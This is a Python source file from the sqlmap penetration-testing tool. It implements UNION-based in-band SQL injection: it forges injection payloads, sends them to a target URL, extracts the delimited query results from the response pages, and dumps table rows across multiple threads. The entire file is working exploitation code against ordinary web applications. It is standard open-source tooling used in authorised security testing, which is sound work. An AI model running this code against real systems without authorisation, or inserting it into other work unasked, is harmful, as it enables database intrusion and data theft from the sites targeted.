#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import arrayizeValue
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import extractRegexResult
from lib.core.common import flattenValue
from lib.core.common import getConsoleWidth
from lib.core.common import getUnicode
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import initTechnique
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import parseUnionPage
from lib.core.common import removeReflectiveValues
from lib.core.common import singleTimeWarnMessage
from lib.core.common import wasLastRequestDBMSError
from lib.core.convert import htmlunescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapSyntaxException
from lib.core.settings import FROM_DUMMY_TABLE
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request

def __oneShotUnionUse(expression, unpack=True, limited=False):
    retVal = hashDBRetrieve("%s%s" % (conf.hexConvert, expression), checkConf=True)  # as inband data is stored raw unconverted

    threadData = getCurrentThreadData()
    threadData.resumed = retVal is not None

    if retVal is None:
        check = "(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop)
        trimcheck = "%s(?P<result>.*?)</" % (kb.chars.start)

        # Prepare expression with delimiters
        injExpression = unescaper.unescape(agent.concatQuery(expression, unpack))

        where = PAYLOAD.WHERE.NEGATIVE if conf.limitStart or conf.limitStop else None

        # Forge the inband SQL injection request
        vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector
        query = agent.forgeInbandQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, limited)
        payload = agent.payload(newValue=query, where=where)

        # Perform the request
        page, headers = Request.queryPage(payload, content=True, raise404=False)

        incrementCounter(PAYLOAD.TECHNIQUE.UNION)

        # Parse the returned page to get the exact union-based
        # sql injection output
        retVal = reduce(lambda x, y: x if x is not None else y, ( \
                extractRegexResult(check, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE), \
                extractRegexResult(check, removeReflectiveValues(listToStrValue(headers.headers \
                if headers else None), payload, True), re.DOTALL | re.IGNORECASE)), \
                None)

        if retVal is not None:
            retVal = getUnicode(retVal, kb.pageEncoding)

            # Special case when DBMS is Microsoft SQL Server and error message is used as a result of inband injection
            if Backend.isDbms(DBMS.MSSQL) and wasLastRequestDBMSError():
                retVal = htmlunescape(retVal).replace("<br>", "\n")

            hashDBWrite("%s%s" % (conf.hexConvert, expression), retVal)
        else:
            trimmed = extractRegexResult(trimcheck, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE) \
                    or extractRegexResult(trimcheck, removeReflectiveValues(listToStrValue(headers.headers \
                    if headers else None), payload, True), re.DOTALL | re.IGNORECASE)

            if trimmed:
                warnMsg = "possible server trimmed output detected (due to its length): "
                warnMsg += trimmed
                logger.warn(warnMsg)

    return retVal

def configUnion(char=None, columns=None):
    def __configUnionChar(char):
        if not isinstance(char, basestring):
            return

        kb.uChar = char

        if conf.uChar is not None:
            kb.uChar = char.replace("[CHAR]", conf.uChar if conf.uChar.isdigit() else "'%s'" % conf.uChar.strip("'"))

    def __configUnionCols(columns):
        if not isinstance(columns, basestring):
            return

        columns = columns.replace(" ", "")
        if "-" in columns:
            colsStart, colsStop = columns.split("-")
        else:
            colsStart, colsStop = columns, columns

        if not colsStart.isdigit() or not colsStop.isdigit():
            raise sqlmapSyntaxException, "--union-cols must be a range of integers"

        conf.uColsStart, conf.uColsStop = int(colsStart), int(colsStop)

        if conf.uColsStart > conf.uColsStop:
            errMsg = "--union-cols range has to be from lower to "
            errMsg += "higher number of columns"
            raise sqlmapSyntaxException, errMsg

    __configUnionChar(char)
    __configUnionCols(conf.uCols or columns)

def unionUse(expression, unpack=True, dump=False):
    """
    This function tests for an inband SQL injection on the target
    url then call its subsidiary function to effectively perform an
    inband SQL injection on the affected url
    """

    initTechnique(PAYLOAD.TECHNIQUE.UNION)

    abortedFlag = False
    count = None
    origExpr = expression
    startLimit = 0
    stopLimit = None
    value = None

    width = getConsoleWidth()
    start = time.time()

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(origExpr)

    if expressionFieldsList and len(expressionFieldsList) > 1 and " ORDER BY " in expression.upper():
        # No need for it in multicolumn dumps (one row is retrieved per request) and just slowing down on large table dumps
        expression = expression[:expression.upper().rindex(" ORDER BY ")]

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry per time
    # NOTE: I assume that only queries that get data from a table can
    # return multiple entries
    if (kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE or \
       (dump and (conf.limitStart or conf.limitStop))) and \
       " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() \
       not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE \
       and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) \
       and not re.search(SQL_SCALAR_REGEX, expression, re.I):

        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
        topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)

        if limitRegExp or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                if limitGroupStart.isdigit():
                    startLimit = int(limitRegExp.group(int(limitGroupStart)))

                stopLimit = limitRegExp.group(int(limitGroupStop))
                limitCond = int(stopLimit) > 1

            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                if limitRegExp:
                    limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                    limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1

                elif topLimit:
                    startLimit = 0
                    stopLimit = int(topLimit.group(1))
                    limitCond = int(stopLimit) > 1

            elif Backend.isDbms(DBMS.ORACLE):
                limitCond = False
        else:
            limitCond = True

        # I assume that only queries NOT containing a "LIMIT #, 1"
        # (or similar depending on the back-end DBMS) can return
        # multiple entries
        if limitCond:
            if limitRegExp:
                stopLimit = int(stopLimit)

                # From now on we need only the expression until the " LIMIT "
                # (or similar, depending on the back-end DBMS) word
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    stopLimit += startLimit
                    untilLimitChar = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
                    expression = expression[:untilLimitChar]

                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                    stopLimit += startLimit
            elif dump:
                if conf.limitStart:
                    startLimit = conf.limitStart - 1
                if conf.limitStop:
                    stopLimit = conf.limitStop

            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % '*', 1)

            if " ORDER BY " in countedExpression.upper():
                _ = countedExpression.upper().rindex(" ORDER BY ")
                countedExpression = countedExpression[:_]

            output = __oneShotUnionUse(countedExpression, unpack)
            count = parseUnionPage(output)

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "the SQL query used returns "
                    infoMsg += "%d entries" % stopLimit
                    logger.info(infoMsg)

            elif count and (not isinstance(count, basestring) or not count.isdigit()):
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the SQL query provided. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1

            elif not count or int(count) == 0:
                if not count:
                    warnMsg = "the SQL query provided does not "
                    warnMsg += "return any output"
                    logger.warn(warnMsg)
                else:
                    value = []  # for empty tables
                return value

            threadData = getCurrentThreadData()
            threadData.shared.limits = iter(xrange(startLimit, stopLimit))
            numThreads = min(conf.threads, (stopLimit - startLimit))
            threadData.shared.value = BigArray()

            if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                kb.suppressResumeInfo = True
                debugMsg = "suppressing possible resume console info because of "
                debugMsg += "large number of rows. It might take too long"
                logger.debug(debugMsg)

            try:
                def unionThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        with kb.locks.limits:
                            try:
                                num = threadData.shared.limits.next()
                            except StopIteration:
                                break

                        if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                            field = expressionFieldsList[0]
                        elif Backend.isDbms(DBMS.ORACLE):
                            field = expressionFieldsList
                        else:
                            field = None

                        limitedExpr = agent.limitQuery(num, expression, field)
                        output = __oneShotUnionUse(limitedExpr, unpack, True)

                        if not kb.threadContinue:
                            break

                        if output:
                            if all(map(lambda x: x in output, [kb.chars.start, kb.chars.stop])):
                                items = parseUnionPage(output)
                                if isNoneValue(items):
                                    continue
                                with kb.locks.value:
                                    for item in arrayizeValue(items):
                                        threadData.shared.value.append(item)
                            else:
                                items = output.replace(kb.chars.start, "").replace(kb.chars.stop, "").split(kb.chars.delimiter)

                            if conf.verbose == 1:
                                status = "[%s] [INFO] %s: %s" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", safecharencode(",".join("\"%s\"" % _ for _ in flattenValue(arrayizeValue(items)))))

                                if len(status) > width:
                                    status = "%s..." % status[:width - 3]

                                dataToStdout("%s\r\n" % status, True)

                runThreads(numThreads, unionThread)

                if conf.verbose == 1:
                    clearConsoleLine(True)

            except KeyboardInterrupt:
                abortedFlag = True

                warnMsg = "user aborted during enumeration. sqlmap "
                warnMsg += "will display partial output"
                logger.warn(warnMsg)

            finally:
                value = threadData.shared.value
                kb.suppressResumeInfo = False

    if not value and not abortedFlag:
        expression = re.sub("\s*ORDER BY\s+[\w,]+", "", expression, re.I) # full inband doesn't play well with ORDER BY
        value = __oneShotUnionUse(expression, unpack)

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = "performed %d queries in %d seconds" % (kb.counters[PAYLOAD.TECHNIQUE.UNION], duration)
        logger.debug(debugMsg)

    return value
